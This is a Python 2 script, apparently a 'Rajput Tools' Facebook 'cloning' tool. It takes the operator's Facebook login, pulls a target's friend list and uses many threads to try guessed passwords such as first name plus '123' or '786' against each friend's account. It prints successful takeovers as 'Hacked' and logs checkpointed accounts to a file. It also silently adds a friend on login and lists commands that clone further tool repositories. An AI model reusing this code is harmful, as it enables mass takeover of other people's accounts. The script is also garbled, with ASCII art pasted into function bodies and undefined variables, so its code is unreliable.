#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Rana_Nadeem_Rajput
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(2000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 kashiWorldCloning.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'God by Frends '
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:𝐁𝐑𝐀𝐍𝐃𝐄𝐃_𝐑𝐀𝐉𝐏𝐔𝐓
##### LOGO #####
logo = """
\033[1;91m◆❃☸❃◆◆❃☸❃◆◆❃☸❃◆◆❃☸❃◆
\033[1;92m𝐖𝐄𝐋𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐑𝐀𝐉𝐏𝐔𝐓 𝐓𝐎𝐎𝐋𝐒                    
\033[1;92m𝐑𝐀𝐍𝐀 𝐖𝐇𝐀𝐓𝐒𝐀𝐏
\033[1;91m   03082503426
\033[1;91m𝐁𝐑𝐀𝐍𝐃𝐄𝐃 𝐑𝐀𝐍𝐀                 
\033[1;91m◆❃☸❃◆◆❃☸❃◆◆❃☸❃◆◆❃☸❃◆
"""
logo2 = """   
❤❖ ──💜𝐁𝐑𝐀𝐍𝐃 𝐑𝐀𝐉𝐏𝐔𝐓💙 ── ❖❤
◆❃◆
❃◆◆❃
◆❃☸❃◆
◆❃◆◆❃◆
◆❃◆◆❃◆
꧁ঔৣ☬❉{ 𝐑𝐀𝐍𝐀-𝐍𝐀𝐃𝐄𝐄𝐌}❉ঔৣ꧂
◆❃◆◆❃◆
◆❃◆◆❃◆
◆❃☸❃◆
❃◆◆❃
◆❃◆
❤❖ ──💜𝐁𝐑𝐀𝐍𝐃   𝐑𝐀𝐉𝐏𝐔𝐓💙── ❖❤ """
logo3 = """
\033[1;91m
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝"""
logo4 = """
\033[1;96m
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝"""
logo5 = """
\033[1;91m
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝"""
logo6 = """
\033[1;93m
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93m𝐑𝐀𝐉𝐏𝐔𝐓 𝐓𝐎𝐎𝐋𝐒 𝐋𝐎𝐀𝐃𝐈𝐍𝐆 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓... \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;91m◆❃☸❃◆◆❃☸❃◆◆❃☸❃◆◆❃☸❃◆
\033[1;92m𝐖𝐄𝐋𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐑𝐀𝐉𝐏𝐔𝐓 𝐓𝐎𝐎𝐋𝐒                    
\033[1;92m𝐑𝐀𝐍𝐀 𝐖𝐇𝐀𝐓𝐒𝐀𝐏
\033[1;91m   03082503426
\033[1;91m𝐁𝐑𝐀𝐍𝐃𝐄𝐃 𝐑𝐀𝐍𝐀                 
\033[1;91m◆❃☸❃◆◆❃☸❃◆◆❃☸❃◆◆❃☸❃◆"""
jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
jalan("\033[1;93m▇▇\033[1;95m   [[[[[ WELLCOM TO RAJPUT BRAND]]]]]\033[1;93m")
jalan("\033[1;93m▇▇\033[1;91m         [[[[[[[[[    HACKING TOOLS    ]]]]]]]]]   \033[1;93m")
jalan("\033[1;93m▇▇\033[1;96m   [[[[[      FOR MORE INFORMATION   ]]]]]   \033[1;93m")
jalan("\033[1;93m▇▇\033[1;92m        WHATSAP NUMBER  03082503426    \033[1;93m")
jalan("\033[1;93m▇▇\033[1;97m         FACEBOOK -- MUHAMMAD NADEEM   \033[1;93m")
jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
print "\033[1;92m۞۞۞۞۞۞۞۞۞۞\033[1;91mRAJPUT BRAND\033[1;92m۞۞۞۞۞۞۞۞۞۞"
CorrectUsername = "Rana"
CorrectPassword = "Nadeem"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m👽 \x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m👽 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Rana_Nadeem
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://www.facebook.com/muhammad.nadeem.5214')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.facebook.com/muhammad.nadeem.5214')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m1.\x1b[1;92m Login  Facebook "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;95m2.\x1b[1;95m Login  Using Token"
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;98m3.\x1b[1;97m Get Access Token App Fb"
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m0.\033[1;91m Exit             "
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
        elif peak =="1":
		login1()
	elif peak =="2":
		tokenz()
        elif peak =="3":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login() 
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo13
		jalan(' \033[1;91mWarning  \033[1;92mDo Not Use Your Personal Account' )
		jalan(' \033[1;91mWarning  \033[1;92mUse a New Account To Login' )
		jalan(' \033[1;91mWarning  \033[1;92mTermux All Version Work ' )                 
		print "\033[1;95m«-----------------\033[1;91mRAJPUT BRAND\033[1;95m-----------------»"
		print('\033[1;97m\x1b[1;92m..............LOGIN WITH FACEBOOK.............\x1b[1;97m' )
		print('	' )
		id = raw_input('\033[1;97m[] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful.•◈•..'
				os.system('xdg-open https://www.facebook.com/muhammad.nadeem.5214')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:RAJPUT BRAND
        time.sleep(0.05)
	print logo2
	██████╗░░█████╗░███╗░░██╗░█████╗░
    ██╔══██╗██╔══██╗████╗░██║██╔══██╗
    ██████╔╝███████║██╔██╗██║███████║
    ██╔══██╗██╔══██║██║╚████║██╔══██║
    ██║░░██║██║░░██║██║░╚███║██║░░██║
    ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
	print "\033[1;94m    «-------\033[1;96mWELLCOME TO RAJPUT TOOLS\033[1;93m----------»"
        time.sleep(0.05)
	print "	   \033[1;93m «----Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
        time.sleep(0.05)
	print "	   \033[1;93m «----ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
        time.sleep(0.05)
  print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;96m\033[1;92m Start    Cloning [RANA]   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;96m\033[1;91m Start    Target  Hacking  [RANA]   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\033[1;96m\033[1;93m Facebook Report [Nadeem]    "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\x1b[1;96m\033[1;91m RanaNadeem   All Commands  "
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m0 .\033[1;91m\033[1;91m logout                         "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mChoose Option>>> \033[1;93m")
	if unikers =="":
		print "\x1b[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		crack()
        elif unikers =="2":
		os.system('clear')
		print logo
		brute()
        elif unikers =="3":
		fighter()
        elif unikers =="4":
		asif()
		os.system('clear')
		print logo10
		██████╗░░█████╗░███╗░░██╗░█████╗░
        ██╔══██╗██╔══██╗████╗░██║██╔══██╗
        ██████╔╝███████║██╔██╗██║███████║
        ██╔══██╗██╔══██║██║╚████║██╔══██║
        ██║░░██║██║░░██║██║░╚███║██║░░██║
        ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
		print "\033[1;95m«-----------------\033[1;91mMessage\033[1;95m---------------»"
                jalan('\033[1;92m............Massage..........')
		jalan('\033[1;95mID Not Found Problum Salution Menu 5 Num Option')
                jalan("\033[1;96mTermux  Data Clear Every Day")
                jalan('\033[1;96mCommand Complet  98% ')
                jalan('\033[1;96mCommand Update Every day')
                jalan("\033[1;93m.......All..Command...........")
                jalan('\033[1;91⭕No1⭕')
                jalan('\033[1;96mapt update')
                jalan('\033[1;96mapt upgrade')
                jalan('\033[1;96mpkg install python')
                jalan('\033[1;96mpkg install python2')
                jalan('\033[1;96mpkg install git')
                jalan('\033[1;96mpip2 install requests')
                jalan('\033[1;96mpip2 install mechanize') 
                jalan("\033[1;96mgit clone https://github.com/Rananadeem5214/ahtesham_khan.git")
                jalan('\033[1;96mcd ahtesham_khan')
                jalan('\033[1;96mpython2 Sana_khan.py')
                jalan('\033[1;96m')
                jalan('\033[1;96mTRICK MASTER')
                jalan('\033[1;92m👆Copy Command & send 2 groups👆')
                jalan('\033[1;91mYoutube Chenal Like Subscrib plzz')
                jalan('\033[1;92m⭕No2⭕')
                jalan('\033[1;91mapt update')
                jalan('\033[1;91mapt upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/Rananadeem1214/Rana_02')
                jalan('\033[1;91mcd Rana_02')
                jalan('\033[1;91mpython2 NADEEM003.py')
                jalan('\033[1;91mUser Name : Rana')
                jalan('\033[1;91mPassword   : Nadeem')
                jalan('\033[1;97m⭕No3⭕')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/Rananadeem5214/Rana_004')
                jalan('\033[1;91mcd Rana_004')
                jalan('\033[1;91mpython2 FILECRACK.py')
                jalan('\033[1;91mUser Name :  Rana')
                jalan('\033[1;91mPassword: Nadeem')
                jalan('\033[1;96m⭕No4⭕')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/Rananadeem/Mental/')
                jalan('\033[1;91mcd Mental')
                jalan('\033[1;91mpython2 RAJPUT420.py')
                jalan('\033[1;91user...Rana
                jalan('\033[1;91pass..Nadeem
                jalan('\033[1;95m⭕No5⭕')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/Rananadeem5214/rana_002/')
                jalan('\033[1;91mcd rana_002')
                jalan('\033[1;91mpython2 NADEEM0002')
                jalan('\033[1;91mUser Name:Rana')
                jalan('\033[1;91mPassword  :Nadeem')
                os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
                print logo22
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo26
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;95m Start Cloning Pakistan       "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\033[1;95m Start Cloning Indian Old     "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\033[1;95m Start Cloning Pakistan Old   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0 .\033[1;91m Back"
	pilih_cracklogo
	
	
	def pilih_crack():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	elif peak =="1":
		os.system('clear')
		print logo
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
       jjt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
		print "\033[1;95m«-----------------\033[1;91mRAJPUT BRAND\033[1;95m---------------»"
		try:
			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
			td = json.loads(m.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			crack()
		print"\033[1;93mGetting IDs\033[1;93m..."
		n = requests.get("https://graph.facebook.com/"+jjt+"/friends?access_token="+toket)
		d = json.loads(n.text)
		for c in d['data']:
			id.append(c['id'])
        elif peak =="2":
	        super()
        elif peak =="3":
	        hack()
	    elif peak =="0":
		menu()
	else:
	print "\x1b[1;91mFill in correctly"
		pilih_crack()
	
	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
	jalan('\033[1;93mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----Rana\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97mNadeem----»"
	print "\033[1;97m«--------------------Rana\033[1;92m▣\033[1;97mNadeem------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning Pakistan ')
	print "\033[1;97m«--------------------Rana\033[1;92m▣\033[1;97mNadeem------------------»"
	
			
	def main(arg):
		global cekpoint,sucessful
		user = arg
		try:
			os.mkdir('cookie')
		except OSError:
			pass #Dev:Rana_Nadeem
		try:
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92m[Rana.Hacked]\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92m[Rana.cp]\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name']+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92m[Rana.Hacked]\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name']+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92m[Rana.cp]\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name']+'786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92m[Rana.Hacked]\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['first_name'] + b['last_name']+'786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92m[Rana.Hacked]\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = b['first_name']+'1122'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92m[Rana.Hacked]\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mRAJPUT BRAND\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Rana-Nadeem--•◈•---»"#Dev:Rana_Nadeem
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (Back)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 NADEEM0003.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Rana.Hacked/\x1b[1;91mRana.cp \033[1;93m: \033[1;92m"+str(len(oks))+"\033[1;95m/\033[1;91m"+str(len(cekpoint))
	print """
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
Don't Worry Your Error ID Will Be Open After 7 Days 

